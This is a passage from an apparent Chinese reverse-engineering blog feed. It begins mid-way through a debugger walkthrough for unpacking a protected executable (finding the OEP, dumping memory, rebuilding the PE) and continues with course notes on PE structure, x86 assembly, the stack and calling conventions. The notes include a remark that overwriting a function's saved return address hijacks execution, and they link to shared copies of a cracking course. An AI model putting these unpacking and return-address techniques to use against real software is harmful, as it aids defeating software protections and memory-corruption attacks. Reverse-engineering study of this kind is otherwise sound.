0012ff68，SHIFT+F9，取消断点，F8，来到最佳的以壳解壳地方</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203912073.png\" alt=\"image-20230823203912073\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203923850.png\" alt=\"image-20230823203923850\"></p>\n<p>00C85793     BB A2000000         mov ebx,0A2  // 最佳地</p>\n<p>00C85798     0BDB                or ebx,ebx</p>\n<p>00C8579A     75 07               jnz short 00C857A3</p>\n<p>00C8579C     894424 1C           mov dword ptr ss:[esp+1C],eax</p>\n<p>00C857A0     61                  popad</p>\n<p>00C857A1     50                  push eax</p>\n<p>00C857A2     C3                  retn</p>\n<p>00C857A3     E8 00000000         call 00C857A8</p>\n<p>00C857A8     5D                  pop ebp</p>\n<p>00C857A9     81ED 4DE14B00       sub ebp,4BE14D</p>\n<p>5、完整转存，区域转存</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203941909.png\" alt=\"image-20230823203941909\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823203959096.png\" alt=\"image-20230823203959096\"></p>\n<p>选择区段，在最后一个区段选择从磁盘载入刚刚部分转存的区段</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823204011420.png\" alt=\"image-20230823204011420\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823204023782.png\" alt=\"image-20230823204023782\"></p>\n<p>保存</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823204034685.png\" alt=\"image-20230823204034685\"></p>\n<p>重建 pe</p>\n<p>6、修复</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823204045107.png\" alt=\"image-20230823204045107\"></p>\n<p>修改 oep 为 885793</p>\n",
            "tags": [
                "逆向"
            ]
        },
        {
            "id": "http://example.com/2023/01/03/%E6%BB%B4%E6%B0%B4reverse/",
            "url": "http://example.com/2023/01/03/%E6%BB%B4%E6%B0%B4reverse/",
            "title": "水滴rev",
            "date_published": "2023-01-03T05:38:45.000Z",
            "content_html": "<h1 id=\"滴水reverse\"><a class=\"markdownIt-Anchor\" href=\"#滴水reverse\">#</a> 滴水 reverse</h1>\n<h2 id=\"link\"><a class=\"markdownIt-Anchor\" href=\"#link\">#</a> link</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tL3MvTEh6TmhKNU16RlYvZm9sZGVyLzYxNzAwMTk5ZGZhZDFmYmVkZDkyNDY1NWI2YWMyOWYzYjdjNzMzMzU=\">阿里云盘分享 (aliyundrive.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWhzTG03Q28jbGlzdC9wYXRoPSUyRnNoYXJlbGluazE3Nzk5MzM0NzEtNTE1NzA2OTI5NzY5MTcwJTJGJUU4JUE3JTg2JUU5JUEyJTkxJUU2JTk1JTk5JUU3JUE4JThCJmFtcDtwYXJlbnRQYXRoPSUyRnNoYXJlbGluazE3Nzk5MzM0NzEtNTE1NzA2OTI5NzY5MTcw\">视频教程_免费高速下载 | 百度网盘 - 分享无限制 (baidu.com)</span></p>\n<p>[0404-NCK 逆向课程滴滴水网络逆向破解基础初级中级就业班工具完整教程_免费高速下载 | 百度网盘 - 分享无限制 (<span class=\"exturl\" data-url=\"aHR0cDovL2JhaWR1LmNvbQ==\">baidu.com</span>)](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMUV0TkNTSWpEZG1MNUZ1c196MmNrU3cjbGlzdC9wYXRoPSUyRjA0MDQtTkNLJUU5JTgwJTg2JUU1JTkwJTkxJUU4JUFGJUJFJUU3JUE4JThCJUU2JUJCJUI0JUU2JUJCJUI0JUU2JUIwJUI0JUU3JUJEJTkxJUU3JUJCJTlDJUU5JTgwJTg2JUU1JTkwJTkxJUU3JUEwJUI0JUU4JUE3JUEzJUU1JTlGJUJBJUU3JUExJTgwJUU1JTg4JTlEJUU3JUJBJUE3JUU0JUI4JUFEJUU3JUJBJUE3JUU1JUIwJUIxJUU0JUI4JTlBJUU3JThGJUFEJUU1JUI3JUE1JUU1JTg1JUI3JUU1JUFFJThDJUU2JTk1JUI0JUU2JTk1JTk5JUU3JUE4JThCJTJGVi0xMzA5JUVGJUJDJTlBRCVFNiVCMCVCNCVFNyVCRCU5MSVFNyVCQiU5QyVFOSU4MCU4NiVFNSU5MCU5MSVFNyVBMCVCNCVFOCVBNyVBMw==\">https://pan.baidu.com/s/1EtNCSIjDdmL5Fus_z2ckSw#list/path=%2F0404-NCK 逆向课程滴滴水网络逆向破解基础初级中级就业班工具完整教程 %2FV-1309：D 水网络逆向破解</span> 基础 %2B 中级 %2B 就业班合集（完结 ）&amp;parentPath=%2F)</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5ODA1NDc3P3R5cGU9YmxvZw==\">Revival_S_滴水逆向三期，C 语言入门，数据结构 - CSDN 博客</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x5Z2wzNS9jYXRlZ29yeV8xMDY3ODk1OS5odG1s\">逆向开发学习笔记_lygl35 的博客 - CSDN 博客</span></p>\n<p>PE 文件结构</p>\n<p>任何一个在 Windows 上运行的可执行文件都要遵守一定的格式，这个格式就是 PE 文件结构，比如:exe, dIl, 部分 sys</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20191105010140189.png\" alt=\"img\"></p>\n<p>此处可使用 PEID 或 ExeinfoPE 进行代替</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210120028888.png\" alt=\"image-20221210120028888\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210132659775.png\" alt=\"image-20221210132659775\"></p>\n<p>32 位计算机最大内存 4G，寻址宽度 32 位</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210141922512.png\" alt=\"image-20221210141922512\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210141955667.png\" alt=\"image-20221210141955667\"></p>\n<p>push esp-4 , 压栈，EIP +4</p>\n<p>call EIP 跳转，esp-4 压栈</p>\n<p>ret 将栈中的地址弹出到 EIP，esp-4</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211125947066.png\" alt=\"image-20221211125947066\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211130508986.png\" alt=\"image-20221211130508986\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211131806741.png\" alt=\"image-20221211131806741\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211133036307.png\" alt=\"image-20221211133036307\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211133000935.png\" alt=\"image-20221211133000935\"></p>\n<p>arr [6] 是 ebp+4，放的是函数返回值的地址，修改了返回值在函数返回时会自动执行</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211133428315.png\" alt=\"image-20221211133428315\"></p>\n<p>全局变量在 pe 头的数据中，局部变量在堆栈中</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211135158527.png\" alt=\"image-20221211135158527\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211135229931.png\" alt=\"image-20221211135229931\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211134515487.png\" alt=\"image-20221211134515487\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211134557068.png\" alt=\"image-20221211134557068\"></p>\n<h2 id=\"汇编\"><a class=\"markdownIt-Anchor\" href=\"#汇编\">#</a> 汇编</h2>\n<h3 id=\"进制\"><a class=\"markdownIt-Anchor\" href=\"#进制\">#</a> 进制</h3>\n<p>进制的本质是查数</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221212151456236.png\" alt=\"image-20221212151456236\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221212151324431.png\" alt=\"image-20221212151324431\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221212151333052.png\" alt=\"image-20221212151333052\"></p>\n<h3 id=\"数据宽度\"><a class=\"markdownIt-Anchor\" href=\"#数据宽度\">#</a> 数据宽度</h3>\n<p>4 位宽度表示</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213152958630.png\" alt=\"image-20221213152958630\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213153742328.png\" alt=\"image-20221213153742328\"></p>\n<p>8 位宽度表示</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213153933311.png\" alt=\"image-20221213153933311\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213154014302.png\" alt=\"image-20221213154014302\"></p>\n<p>16 位宽度表示</p>\n<p>32 位宽度表示</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213154324319.png\" alt=\"image-20221213154324319\"></p>\n<p>6、几个重要的计量单位:</p>\n<p>BYTE 字节 8BIT</p>\n<p>WORD 字 16BIT 2 字节</p>\n<p>DWORD 双字 32BIT 4 字节</p>\n<p>or</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213154728965.png\" alt=\"image-20221213154728965\"></p>\n<p>and</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213155024628.png\" alt=\"image-20221213155024628\"></p>\n<p>xor</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213155128086.png\" alt=\"image-20221213155128086\"></p>\n<p>not</p>\n<p>2+3</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210132659775.png\" alt=\"image-20221210132659775\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213160855262.png\" alt=\"image-20221213160855262\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213160948087.png\" alt=\"image-20221213160948087\"></p>\n<h3 id=\"寄存器\"><a class=\"markdownIt-Anchor\" href=\"#寄存器\">#</a> 寄存器</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213162041512.png\" alt=\" \"></p>\n<p>mov ebx,0x123456789    //ebx=23456789  忽略高位，1 是高位</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213171205765.png\" alt=\"image-20221213171205765\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213171554801.png\" alt=\"image-20221213171554801\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213174336225.png\" alt=\"image-20221213174336225\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213175435630.png\" alt=\"image-20221213175435630\"></p>\n<p><img data-src=\"../AppData/Roaming/Typora/typora-user-images/image-20221213182649856.png\" alt=\"image-20221213182649856\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213183047619.png\" alt=\"image-20221213183047619\"></p>\n<p><strong>我们可以打补丁或者其他方式拓展内存</strong></p>\n<h3 id=\"内存\"><a class=\"markdownIt-Anchor\" href=\"#内存\">#</a> 内存</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213183647234.png\" alt=\"image-20221213183647234\"></p>\n<p>栈中每四个内存单元一组</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213184806456.png\" alt=\"image-20221213184806456\" style=\"zoom:200%;\" />\n<p>数据窗口中以小端存储以 db 查看时</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214203828764.png\" alt=\"image-20221214203828764\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214203909142.png\" alt=\"image-20221214203909142\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214204249791.png\" alt=\"image-20221214204249791\"></p>\n<p>0012FFDC = E4</p>\n<p>0012FFDD = 7C</p>\n<p>在数据窗口是小端在前</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214205211991.png\" alt=\"image-20221214205211991\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214205617926.png\" alt=\"image-20221214205617926\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214210429166.png\" alt=\"image-20221214210429166\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214210441256.png\" alt=\"image-20221214210441256\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214210742628.png\" alt=\"image-20221214210742628\"></p>\n<h3 id=\"堆栈\"><a class=\"markdownIt-Anchor\" href=\"#堆栈\">#</a> 堆栈</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214213244308.png\" alt=\"image-20221214213244308\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214213607192.png\" alt=\"image-20221214213607192\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214214015040.png\" alt=\"image-20221214214015040\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214214825379.png\" alt=\"image-20221214214825379\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push imm    //esp-4</span><br><span class=\"line\">push al     //不能push8位</span><br><span class=\"line\">push ax     //esp-2</span><br><span class=\"line\">push eax    //esp-4</span><br><span class=\"line\">push dword ptr ds:[12FFDC]   //esp-4</span><br><span class=\"line\">push word ptr ds:[12FFDC]    //esp-2</span><br><span class=\"line\">push byte ptr ds:[12FFDC]    //不能push 8位内存</span><br><span class=\"line\"></span><br><span class=\"line\">pushad   //将所有通用寄存器入栈</span><br><span class=\"line\">popad </span><br></pre></td></tr></table></figure>\n<h3 id=\"jcc\"><a class=\"markdownIt-Anchor\" href=\"#jcc\">#</a> JCC</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219205236604.png\" alt=\"image-20221219205236604\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219205328411.png\" alt=\"image-20221219205328411\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219210046713.png\" alt=\"image-20221219210046713\"></p>\n<p>只计算最低有效字节中的 1 的个数</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219210317802.png\" alt=\"image-20221219210317802\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">看当前数据宽度/2 中间的位是否进位</span><br><span class=\"line\">12345678  看5是否产生进位</span><br><span class=\"line\">16位，8位一样 </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219210949437.png\" alt=\"image-20221219210949437\"></p>\n<p>test 和 xor 的区别</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219211306372.png\" alt=\"image-20221219211306372\"></p>\n<hr>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219212150517.png\" alt=\"image-20221219212150517\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219213621597.png\" alt=\"image-20221219213621597\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219213712037.png\" alt=\"image-20221219213712037\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219213903993.png\" alt=\"image-20221219213903993\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adc al,cl</span><br><span class=\"line\">al = al + cl + 进位标志carry(1)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219214113901.png\" alt=\"image-20221219214113901\"></p>\n<p>Borrow</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219214341294.png\" alt=\"image-20221219214341294\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219214413526.png\" alt=\"image-20221219214413526\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219215219369.png\" alt=\"image-20221219215219369\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movs stos  移动方向由D标志位决定 </span><br><span class=\"line\">D = 0 + </span><br><span class=\"line\">D = 1 -</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219215520140.png\" alt=\"image-20221219215520140\"></p>\n<h3 id=\"jcc-2\"><a class=\"markdownIt-Anchor\" href=\"#jcc-2\">#</a> JCC</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221228171843970.png\" alt=\"image-20221228171843970\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221228184206472.png\" alt=\"image-20221228184206472\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221228184559423.png\" alt=\"image-20221228184559423\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221228184754864.png\" alt=\"image-20221228184754864\"></p>\n<p>test  可以判断寄存器中值是否为 0</p>\n<p><strong>call 执行时首先将 call 的下一条命令入栈，通过当前地址 + 当前指令长度，指令长度通过硬编码确定，此时 esp-4，作为 call ret 之后的下一条执行，EIP 变为 call 的地址</strong></p>\n<p><strong>ret 时将栈顶的返回地址给 EIP，esp+4</strong></p>\n<p><strong>因此一个函数在被调用时，堆栈栈顶就是他返回后执行的下一条指令</strong></p>\n<h3 id=\"堆栈图\"><a class=\"markdownIt-Anchor\" href=\"#堆栈图\">#</a> 堆栈图</h3>\n<p>定位到 winMain</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221230210156563.png\" alt=\"image-20221230210156563\"></p>\n<p>有如下函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401085  |.  6A 04         push    0x4</span><br><span class=\"line\">00401087  |.  6A 03         push    0x3</span><br><span class=\"line\">00401089  |.  E8 77FFFFFF   call    00401005</span><br><span class=\"line\">0040108E  |.  83C4 08       add     esp,0x8</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401005   $ /E9 16000000   jmp     add</span><br><span class=\"line\">0040100A   $ |E9 51000000   jmp     main</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401020 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">00401021  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401023  |.  83EC 48       sub     esp,0x48</span><br><span class=\"line\">00401026  |.  53            push    ebx</span><br><span class=\"line\">00401027  |.  56            push    esi</span><br><span class=\"line\">00401028  |.  57            push    edi</span><br><span class=\"line\">00401029  |.  8D7D B8       lea     edi,[local.18]</span><br><span class=\"line\">0040102C  |.  B9 12000000   mov     ecx,0x12</span><br><span class=\"line\">00401031  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00401036  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00401038  |.  8B45 08       mov     eax,[arg.1]</span><br><span class=\"line\">0040103B  |.  8945 FC       mov     [local.1],eax</span><br><span class=\"line\">0040103E  |.  8B4D 0C       mov     ecx,[arg.2]</span><br><span class=\"line\">00401041  |.  894D F8       mov     [local.2],ecx</span><br><span class=\"line\">00401044  |.  8B45 FC       mov     eax,[local.1]</span><br><span class=\"line\">00401047  |.  0345 F8       add     eax,[local.2]</span><br><span class=\"line\">0040104A  |.  5F            pop     edi</span><br><span class=\"line\">0040104B  |.  5E            pop     esi</span><br><span class=\"line\">0040104C  |.  5B            pop     ebx</span><br><span class=\"line\">0040104D  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">0040104F  |.  5D            pop     ebp</span><br><span class=\"line\">00401050  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221230235920026.png\" alt=\"image-20221230235920026\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221230235929733.png\" alt=\"image-20221230235929733\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221230235938501.png\" alt=\"image-20221230235938501\"></p>\n<blockquote>\n<p>注意 1:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0018FE94     00000001</span><br><span class=\"line\">0018FE98     0018FF48</span><br><span class=\"line\">0018FE9C     00000000</span><br><span class=\"line\">0018FEA0     7EFDE000</span><br><span class=\"line\">0018FEA4     CCCCCCCC</span><br><span class=\"line\">0018FEA8     CCCCCCCC</span><br><span class=\"line\">0018FEAC     CCCCCCCC</span><br><span class=\"line\">0018FEB0     CCCCCCCC</span><br><span class=\"line\">0018FEB4     CCCCCCCC</span><br><span class=\"line\">0018FEB8     CCCCCCCC</span><br><span class=\"line\">0018FEBC     CCCCCCCC</span><br><span class=\"line\">0018FEC0     CCCCCCCC</span><br><span class=\"line\">0018FEC4     CCCCCCCC</span><br><span class=\"line\">0018FEC8     CCCCCCCC</span><br><span class=\"line\">0018FECC     CCCCCCCC</span><br><span class=\"line\">0018FED0     CCCCCCCC</span><br><span class=\"line\">0018FED4     CCCCCCCC</span><br><span class=\"line\">0018FED8     CCCCCCCC</span><br><span class=\"line\">0018FEDC     CCCCCCCC</span><br><span class=\"line\">0018FEE0     CCCCCCCC</span><br><span class=\"line\">0018FEE4     00000004</span><br><span class=\"line\">0018FEE8     00000003</span><br><span class=\"line\">0018FEEC     0018FF48</span><br><span class=\"line\">0018FEF0     0040108E  add.0040108E</span><br><span class=\"line\">0018FEF4     00000003</span><br><span class=\"line\">0018FEF8     00000004</span><br><span class=\"line\">0018FEFC     00000000</span><br></pre></td></tr></table></figure>\n<p>这是 add esp, 0x8 之后的堆栈，并不是将他清空了，只是改变了 esp，垃圾数据还在那</p>\n<p>注意 2：</p>\n<p>CCCCCCCC 是 int3 的硬编码</p>\n<p>注意 3：</p>\n<p>esp+8 是外部传进来的参数</p>\n<p>esp-4 是函数内部的局部变量</p>\n<p>esp+4 是函数返回的地址</p>\n<p>注意 4：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int add(int a, int b)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint c = a;</span><br><span class=\"line\">\tint d = b;</span><br><span class=\"line\">\treturn c + d;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;Hello World!\\n&quot;);</span><br><span class=\"line\">\tadd(3,4);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//这是函数代码</span><br></pre></td></tr></table></figure>\n<p>注意 5：</p>\n<p>add esp,0x8 是 cdecl 的外平栈</p>\n<p>ret 8 是 stdcall 的内平栈</p>\n<p>注意 6</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lea     edi,dword ptr ss:[ebp-0x48]</span><br><span class=\"line\">mov     ecx,0x12</span><br><span class=\"line\">mov     eax,0xCCCCCCCC</span><br><span class=\"line\">rep     stos dword ptr es:[edi]</span><br></pre></td></tr></table></figure>\n<p>的作用是重复 12 次，将 CCCCCCCC 的值不停填充到 ebp-48 的位置，每填充一次 edi+4，edi+4 或 - 4 由 df 标志位决定，df=0 +  df=1 -</p>\n</blockquote>\n<h3 id=\"函数\"><a class=\"markdownIt-Anchor\" href=\"#函数\">#</a> 函数</h3>\n<p>计算机的函数，是一个固定的一个程序段，或称其为一个子程序，它东可以实现固定运算功能的同时还带有一入口和一个出口，所谓的入口，就是函数所带的各个参数，我们可以通过这个入口，把函数的参数值代入子程序，供计算机处理，所谓出口，就是指函数的计算结果，也称为返回值，在计算机求得之后，由此口带回给调用它的程序。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230101174907969.png\" alt=\"image-20230101174907969\"></p>\n<p>函数传参包括寄存器传参 (比如 this 指针) 和内存传参</p>\n<p>函数返回结果可以通过寄存器返回 (一般为 EAX) 